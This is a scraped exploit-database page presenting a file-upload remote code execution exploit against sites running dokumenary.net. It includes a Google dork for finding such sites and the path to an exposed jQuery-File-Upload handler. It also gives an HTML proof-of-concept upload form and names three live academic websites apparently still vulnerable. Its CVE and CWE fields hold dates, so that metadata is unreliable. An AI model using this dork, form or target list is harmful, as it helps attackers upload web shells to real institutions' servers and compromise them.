---
title: Powered By dokumenary.net Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023010054
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-31
fetch_date: 2025-10-04T05:12:50.393462
---

# Powered By dokumenary.net Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Powered By dokumenary.net Remote Code Execution** **2023.01.30**  **![id](https://cert.cx/cxstatic/images/flags/id.png) [UnM@SK](https://cxsecurity.com/author/UnM%40SK/1/) **(ID)** ![id](https://cert.cx/cxstatic/images/flags/id.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[2023-01-29](https://cxsecurity.com/cveshow/2023-01-29/ "Click to see 2023-01-29")**  CWE: **[2023-01-29](https://cxsecurity.com/cwe/2023-01-29 "Click to see 2023-01-29")**  **[**Dork:** intext:dokumenary.net All rights reserved.](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Arbritrary File Upload - Remote Code Execution
# Google Dork: intext:dokumenary.net All rights reserved.
# Date: 29/01/2023
# Exploit Author: UnM@SK
# Vendor Homepage: https://dokumenary.net
# All Version Not Patched
1 you can go straight to the exploit
2 you access /assets/comp/RichFilemanager/scripts/jQuery-File-Upload/
3 go to exploit csrf file upload
#CSRF
<html><head><title>poc</title>
</head><body bgcolor="white" class="intent-mouse"><center> <h1>My Poc</h1><h1>
<font color="black"> <form method="POST" action="site.idassets/comp/RichFilemanager/scripts/jQuery-File-Upload/server/php/" enctype="multipart/form-data"> <input type="file" name="files[]"><input type="submit" name="Submit" value="Upload ?"> <center><h5></h5>© idiotCrew <h5></h5> </center></form></font></h1></center>
</body></html>
#Live
https://elearning.staiubkujunggading.ac.id/
https://stpsantopetruska.ac.id/new\_elearning/
http://elsas.ar-rum.ac.id/

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010054)

[Tweet](https://twitter.com/share)

Vote for this issue:
 4
 -6

40%

60%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top